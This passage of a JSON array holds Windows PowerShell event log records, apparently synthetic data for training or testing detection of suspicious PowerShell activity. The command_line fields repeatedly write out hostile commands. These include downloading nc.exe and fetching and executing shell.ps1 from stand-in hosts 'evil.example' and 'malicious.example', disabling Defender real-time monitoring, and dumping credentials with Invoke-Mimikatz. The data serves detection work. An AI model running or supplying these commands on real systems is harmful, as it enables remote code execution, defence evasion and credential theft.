    "EventCode": 4103,
    "event_type": "powershell_execution",
    "attack_category": "suspicious_powershell",
    "user": "helpdesk",
    "src_ip": "77.91.68.33",
    "dest_host": "SRV-WEB-01",
    "domain": "CORP",
    "command_line": "powershell -c \"(New-Object System.Net.WebClient).DownloadFile('http://evil.example/nc.exe','C:\\nc.exe')\"",
    "script_block": "powershell -c \"(New-Object System.Net.WebClient).DownloadFile('http://evil.example/nc.exe','C:\\nc.exe')\"",
    "parent_process": "mshta.exe",
    "severity": "high",
    "message": "Suspicious PowerShell execution by helpdesk: powershell -c \"(New-Object System.Net.WebClient).DownloadFil..."
  },
  {
    "_time": "2024-01-01T02:00:24",
    "source": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
    "host": "LAPTOP-EXEC-03",
    "EventCode": 4103,
    "event_type": "powershell_execution",
    "attack_category": "suspicious_powershell",
    "user": "adavis",
    "src_ip": "10.0.2.34",
    "dest_host": "LAPTOP-EXEC-03",
    "domain": "CORP",
    "command_line": "powershell.exe -nop -exec bypass -c \"Import-Module PowerSploit\"",
    "script_block": "powershell.exe -nop -exec bypass -c \"Import-Module PowerSploit\"",
    "parent_process": "wscript.exe",
    "severity": "high",
    "message": "Suspicious PowerShell execution by adavis: powershell.exe -nop -exec bypass -c \"Import-Module PowerSplo..."
  },
  {
    "_time": "2024-01-01T02:01:10",
    "source": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
    "host": "SRV-SQL-01",
    "EventCode": 4103,
    "event_type": "powershell_execution",
    "attack_category": "suspicious_powershell",
    "user": "admin",
    "src_ip": "192.168.1.101",
    "dest_host": "SRV-SQL-01",
    "domain": "CORP",
    "command_line": "powershell.exe -nop -w hidden -enc JABjAGwAaQBlAG4AdAA=",
    "script_block": "powershell.exe -nop -w hidden -enc JABjAGwAaQBlAG4AdAA=",
    "parent_process": "mshta.exe",
    "severity": "high",
    "message": "Suspicious PowerShell execution by admin: powershell.exe -nop -w hidden -enc JABjAGwAaQBlAG4AdAA=..."
  },
  {
    "_time": "2024-01-01T02:01:30",
    "source": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
    "host": "LAPTOP-EXEC-03",
    "EventCode": 4103,
    "event_type": "powershell_execution",
    "attack_category": "suspicious_powershell",
    "user": "mwilson",
    "src_ip": "192.168.1.101",
    "dest_host": "LAPTOP-EXEC-03",
    "domain": "CORP",
    "command_line": "powershell -noprofile -windowstyle hidden -command \"Set-MpPreference -DisableRealtimeMonitoring $true\"",
    "script_block": "powershell -noprofile -windowstyle hidden -command \"Set-MpPreference -DisableRealtimeMonitoring $true\"",
    "parent_process": "wscript.exe",
    "severity": "high",
    "message": "Suspicious PowerShell execution by mwilson: powershell -noprofile -windowstyle hidden -command \"Set-MpPr..."
  },
  {
    "_time": "2024-01-01T02:02:12",
    "source": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
    "host": "LAPTOP-EXEC-03",
    "EventCode": 4104,
    "event_type": "powershell_execution",
    "attack_category": "suspicious_powershell",
    "user": "rjohnson",
    "src_ip": "192.168.1.101",
    "dest_host": "LAPTOP-EXEC-03",
    "domain": "CORP",
    "command_line": "powershell -noprofile -windowstyle hidden -command \"Set-MpPreference -DisableRealtimeMonitoring $true\"",
    "script_block": "powershell -noprofile -windowstyle hidden -command \"Set-MpPreference -DisableRealtimeMonitoring $true\"",
    "parent_process": "wscript.exe",
    "severity": "high",
    "message": "Suspicious PowerShell execution by rjohnson: powershell -noprofile -windowstyle hidden -command \"Set-MpPr..."
  },
  {
    "_time": "2024-01-01T02:03:07",
    "source": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
    "host": "SRV-SQL-01",
    "EventCode": 4104,
    "event_type": "powershell_execution",
    "attack_category": "suspicious_powershell",
    "user": "helpdesk",
    "src_ip": "194.165.16.78",
    "dest_host": "SRV-SQL-01",
    "domain": "CORP",
    "command_line": "powershell.exe -nop -w hidden -enc JABjAGwAaQBlAG4AdAA=",
    "script_block": "powershell.exe -nop -w hidden -enc JABjAGwAaQBlAG4AdAA=",
    "parent_process": "wscript.exe",
    "severity": "high",
    "message": "Suspicious PowerShell execution by helpdesk: powershell.exe -nop -w hidden -enc JABjAGwAaQBlAG4AdAA=..."
  },
  {
    "_time": "2024-01-01T02:03:46",
    "source": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
    "host": "LAPTOP-EXEC-03",
    "EventCode": 4103,
    "event_type": "powershell_execution",
    "attack_category": "suspicious_powershell",
    "user": "kthomas",
    "src_ip": "10.0.2.34",
    "dest_host": "LAPTOP-EXEC-03",
    "domain": "CORP",
    "command_line": "powershell.exe -Command \"IEX (New-Object Net.WebClient).DownloadString('http://malicious.example/shell.ps1')\"",
    "script_block": "powershell.exe -Command \"IEX (New-Object Net.WebClient).DownloadString('http://malicious.example/shell.ps1')\"",
    "parent_process": "cmd.exe",
    "severity": "high",
    "message": "Suspicious PowerShell execution by kthomas: powershell.exe -Command \"IEX (New-Object Net.WebClient).Down..."
  },
  {
    "_time": "2024-01-01T02:03:59",
    "source": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
    "host": "WS-IT-05",
    "EventCode": 4104,
    "event_type": "powershell_execution",
    "attack_category": "suspicious_powershell",
    "user": "jsmith",
    "src_ip": "185.220.101.45",
    "dest_host": "WS-IT-05",
    "domain": "CORP",
    "command_line": "powershell -noprofile -windowstyle hidden -command \"Set-MpPreference -DisableRealtimeMonitoring $true\"",
    "script_block": "powershell -noprofile -windowstyle hidden -command \"Set-MpPreference -DisableRealtimeMonitoring $true\"",
    "parent_process": "wscript.exe",
    "severity": "high",
    "message": "Suspicious PowerShell execution by jsmith: powershell -noprofile -windowstyle hidden -command \"Set-MpPr..."
  },
  {
    "_time": "2024-01-01T02:04:20",
    "source": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
    "host": "WS-HR-02",
    "EventCode": 4103,
    "event_type": "powershell_execution",
    "attack_category": "suspicious_powershell",
    "user": "jsmith",
    "src_ip": "192.168.1.50",
    "dest_host": "WS-HR-02",
    "domain": "CORP",
    "command_line": "powershell -EncodedCommand UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwA=",
    "script_block": "powershell -EncodedCommand UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwA=",
    "parent_process": "cmd.exe",
    "severity": "high",
    "message": "Suspicious PowerShell execution by jsmith: powershell -EncodedCommand UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAc..."
  },
  {
    "_time": "2024-01-01T02:04:55",
    "source": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
    "host": "LAPTOP-EXEC-03",
    "EventCode": 4103,
    "event_type": "powershell_execution",
    "attack_category": "suspicious_powershell",
    "user": "clee",
    "src_ip": "198.54.117.200",
    "dest_host": "LAPTOP-EXEC-03",
    "domain": "CORP",
    "command_line": "powershell -c \"(New-Object System.Net.WebClient).DownloadFile('http://evil.example/nc.exe','C:\\nc.exe')\"",
    "script_block": "powershell -c \"(New-Object System.Net.WebClient).DownloadFile('http://evil.example/nc.exe','C:\\nc.exe')\"",
    "parent_process": "wscript.exe",
    "severity": "high",
    "message": "Suspicious PowerShell execution by clee: powershell -c \"(New-Object System.Net.WebClient).DownloadFil..."
  },
  {
    "_time": "2024-01-01T02:05:39",
    "source": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
    "host": "SRV-WEB-01",
    "EventCode": 4104,
    "event_type": "powershell_execution",
    "attack_category": "suspicious_powershell",
    "user": "jsmith",
    "src_ip": "10.0.2.34",
    "dest_host": "SRV-WEB-01",
    "domain": "CORP",
    "command_line": "powershell.exe Invoke-Mimikatz -DumpCreds",
    "script_block": "powershell.exe Invoke-Mimikatz -DumpCreds",
    "parent_process": "cmd.exe",
    "severity": "high",
    "message": "Suspicious PowerShell execution by jsmith: powershell.exe Invoke-Mimikatz -DumpCreds..."
  },
  {
    "_time": "2024-01-01T02:05:47",
    "source": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
    "host": "LAPTOP-EXEC-03",
    "EventCode": 4104,
    "event_type": "powershell_execution",
    "attack_category": "suspicious_powershell",
    "user": "clee",
    "src_ip": "10.0.2.34",
    "dest_host": "LAPTOP-EXEC-03",
    "domain": "CORP",
    "command_line": "powershell -EncodedCommand UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwA=",
    "script_block": "powershell -EncodedCommand UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwA=",
    "parent_process": "cmd.exe",
    "severity": "high",
    "message": "Suspicious PowerShell execution by clee: powershell -EncodedCommand UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAc..."
  },
  {
    "_time": "2024-01-01T02:06:23",
    "source": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
    "host": "DC-01",
    "EventCode": 4103,
    "event_type": "powershell_execution",
    "attack_category": "suspicious_powershell",
    "user": "administrator",
    "src_ip": "185.56.80.65",
    "dest_host": "DC-01",
    "domain": "CORP",
    "command_line": "powershell -ExecutionPolicy Bypass -File C:\\Temp\\payload.ps1",
    "script_block": "powershell -ExecutionPolicy Bypass -File C:\\Temp\\payload.ps1",
    "parent_process": "wscript.exe",
    "severity": "high",
    "message": "Suspicious PowerShell execution by administrator: powershell -ExecutionPolicy Bypass -File C:\\Temp\\payload.ps1..."
  },
  {
    "_time": "2024-01-01T02:06:32",
    "source": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
    "host": "WS-IT-05",
    "EventCode": 4104,
    "event_type": "powershell_execution",
    "attack_category": "suspicious_powershell",
    "user": "mwilson",
    "src_ip": "10.0.1.12",
    "dest_host": "WS-IT-05",
    "domain": "CORP",
    "command_line": "powershell -c \"(New-Object System.Net.WebClient).DownloadFile('http://evil.example/nc.exe','C:\\nc.exe')\"",
    "script_block": "powershell -c \"(New-Object System.Net.WebClient).DownloadFile('http://evil.example/nc.exe','C:\\nc.exe')\"",
    "parent_process": "mshta.exe",
    "severity": "high",
    "message": "Suspicious PowerShell execution by mwilson: powershell -c \"(New-Object System.Net.WebClient).DownloadFil..."
  },
  {
    "_time": "2024-01-01T02:07:06",
    "source": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
    "host": "SRV-SQL-01",
    "EventCode": 4103,
    "event_type": "powershell_execution",
    "attack_category": "suspicious_powershell",
    "user": "njones",
    "src_ip": "192.168.1.101",
    "dest_host": "SRV-SQL-01",
    "domain": "CORP",
    "command_line": "powershell -EncodedCommand UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwA=",
    "script_block": "powershell -EncodedCommand UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwA=",
    "parent_process": "cmd.exe",
    "severity": "high",
    "message": "Suspicious PowerShell execution by njones: powershell -EncodedCommand UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAc..."
  },
  {
    "_time": "2024-01-01T02:08:05",
    "source": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
    "host": "SRV-WEB-01",
    "EventCode": 4104,
    "event_type": "powershell_execution",
    "attack_category": "suspicious_powershell",
    "user": "admin",
    "src_ip": "198.54.117.200",
    "dest_host": "SRV-WEB-01",
    "domain": "CORP",
    "command_line": "powershell -noprofile -windowstyle hidden -command \"Set-MpPreference -DisableRealtimeMonitoring $true\"",
    "script_block": "powershell -noprofile -windowstyle hidden -command \"Set-MpPreference -DisableRealtimeMonitoring $true\"",
    "parent_process": "wscript.exe",
    "severity": "high",
    "message": "Suspicious PowerShell execution by admin: powershell -noprofile -windowstyle hidden -command \"Set-MpPr..."
  },
  {
    "_time": "2024-01-01T02:08:36",
    "source": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
    "host": "LAPTOP-EXEC-03",
    "EventCode": 4104,
    "event_type": "powershell_execution",
    "attack_category": "suspicious_powershell",
    "user": "lwhite",
    "src_ip": "77.91.68.33",
    "dest_host": "LAPTOP-EXEC-03",
    "domain": "CORP",
    "command_line": "powershell.exe -nop -exec bypass -c \"Import-Module PowerSploit\"",
    "script_block": "powershell.exe -nop -exec bypass -c \"Import-Module PowerSploit\"",
    "parent_process": "cmd.exe",
    "severity": "high",
    "message": "Suspicious PowerShell execution by lwhite: powershell.exe -nop -exec bypass -c \"Import-Module PowerSplo..."
  },
  {
    "_time": "2024-01-01T02:09:01",
    "source": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
    "host": "WS-IT-05",
    "EventCode": 4104,
    "event_type": "powershell_execution",
    "attack_category": "suspicious_powershell",
    "user": "bmartin",
    "src_ip": "194.165.16.78",
    "dest_host": "WS-IT-05",
    "domain": "CORP",
    "command_line": "powershell.exe Invoke-Mimikatz -DumpCreds",
    "script_block": "powershell.exe Invoke-Mimikatz -DumpCreds",
    "parent_process": "winword.exe",
    "severity": "high",
    "message": "Suspicious PowerShell execution by bmartin: powershell.exe Invoke-Mimikatz -DumpCreds..."
  },
  {
    "_time": "2024-01-01T02:09:10",
    "source": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
    "host": "LAPTOP-EXEC-03",
    "EventCode": 4103,
    "event_type": "powershell_execution",
    "attack_category": "suspicious_powershell",
    "user": "adavis",
    "src_ip": "77.91.68.33",
    "dest_host": "LAPTOP-EXEC-03",
    "domain": "CORP",
    "command_line": "powershell -ExecutionPolicy Bypass -File C:\\Temp\\payload.ps1",
    "script_block": "powershell -ExecutionPolicy Bypass -File C:\\Temp\\payload.ps1",
    "parent_process": "cmd.exe",
    "severity": "high",
    "message": "Suspicious PowerShell execution by adavis: powershell -ExecutionPolicy Bypass -File C:\\Temp\\payload.ps1..."
  },
  {
    "_time": "2024-01-01T02:10:02",
    "source": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
    "host": "WS-IT-05",
    "EventCode": 4103,
    "event_type": "powershell_execution",
    "attack_category": "suspicious_powershell",
    "user": "administrator",
    "src_ip": "10.0.1.12",
    "dest_host": "WS-IT-05",
    "domain": "CORP",
    "command_line": "powershell.exe -Command \"IEX (New-Object Net.WebClient).DownloadString('http://malicious.example/shell.ps1')\"",
    "script_block": "powershell.exe -Command \"IEX (New-Object Net.WebClient).DownloadString('http://malicious.example/shell.ps1')\"",
    "parent_process": "mshta.exe",
    "severity": "high",
    "message": "Suspicious PowerShell execution by administrator: powershell.exe -Command \"IEX (New-Object Net.WebClient).Down..."
  },
  {
    "_time": "2024-01-01T02:10:49",
    "source": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
    "host": "DC-01",
    "EventCode": 4104,
    "event_type": "powershell_execution",
    "attack_category": "suspicious_powershell",
    "user": "adavis",
    "src_ip": "192.168.1.50",
    "dest_host": "DC-01",
    "domain": "CORP",
    "command_line": "powershell -c \"(New-Object System.Net.WebClient).DownloadFile('http://evil.example/nc.exe','C:\\nc.exe')\"",
    "script_block": "powershell -c \"(New-Object System.Net.WebClient).DownloadFile('http://evil.example/nc.exe','C:\\nc.exe')\"",
    "parent_process": "cmd.exe",
    "severity": "high",
    "message": "Suspicious PowerShell execution by adavis: powershell -c \"(New-Object System.Net.WebClient).DownloadFil..."
  },
  {
    "_time": "2024-01-01T02:11:12",
    "source": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
    "host": "WS-IT-05",
    "EventCode": 4103,
    "event_type": "powershell_execution",
    "attack_category": "suspicious_powershell",
    "user": "pclark",
    "src_ip": "10.0.1.12",
    "dest_host": "WS-IT-05",
    "domain": "CORP",
    "command_line": "powershell -c \"(New-Object System.Net.WebClient).DownloadFile('http://evil.example/nc.exe','C:\\nc.exe')\"",
    "script_block": "powershell -c \"(New-Object System.Net.WebClient).DownloadFile('http://evil.example/nc.exe','C:\\nc.exe')\"",
    "parent_process": "wscript.exe",
    "severity": "high",
    "message": "Suspicious PowerShell execution by pclark: powershell -c \"(New-Object System.Net.WebClient).DownloadFil..."
  },
  {
    "_time": "2024-01-01T02:11:26",
    "source": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
    "host": "DC-01",
    "EventCode": 4103,
    "event_type": "powershell_execution",
    "attack_category": "suspicious_powershell",
    "user": "admin",
    "src_ip": "185.56.80.65",
    "dest_host": "DC-01",
    "domain": "CORP",
    "command_line": "powershell -noprofile -windowstyle hidden -command \"Set-MpPreference -DisableRealtimeMonitoring $true\"",
    "script_block": "powershell -noprofile -windowstyle hidden -command \"Set-MpPreference -DisableRealtimeMonitoring $true\"",
    "parent_process": "mshta.exe",
    "severity": "high",
    "message": "Suspicious PowerShell execution by admin: powershell -noprofile -windowstyle hidden -command \"Set-MpPr..."
  },
  {
    "_time": "2024-01-01T02:11:38",
    "source": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
    "host": "WS-IT-05",
    "EventCode": 4104,
    "event_type": "powershell_execution",
    "attack_category": "suspicious_powershell",
    "user": "svc_backup",
    "src_ip": "10.0.0.5",
    "dest_host": "WS-IT-05",
    "domain": "CORP",
    "command_line": "powershell -noprofile -windowstyle hidden -command \"Set-MpPreference -DisableRealtimeMonitoring $true\"",
    "script_block": "powershell -noprofile -windowstyle hidden -command \"Set-MpPreference -DisableRealtimeMonitoring $true\"",
    "parent_process": "cmd.exe",
    "severity": "high",
    "message": "Suspicious PowerShell execution by svc_backup: powershell -noprofile -windowstyle hidden -command \"Set-MpPr..."
  },
  {
    "_time": "2024-01-01T02:12:21",
    "source": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
    "host": "SRV-WEB-01",
    "EventCode": 4103,
    "event_type": "powershell_execution",
    "attack_category": "suspicious_powershell",
    "user": "helpdesk",
    "src_ip": "194.165.16.78",
    "dest_host": "SRV-WEB-01",
    "domain": "CORP",
    "command_line": "powershell.exe Invoke-Mimikatz -DumpCreds",
    "script_block": "powershell.exe Invoke-Mimikatz -DumpCreds",
    "parent_process": "mshta.exe",
    "severity": "high",
    "message": "Suspicious PowerShell execution by helpdesk: powershell.exe Invoke-Mimikatz -DumpCreds..."
  },
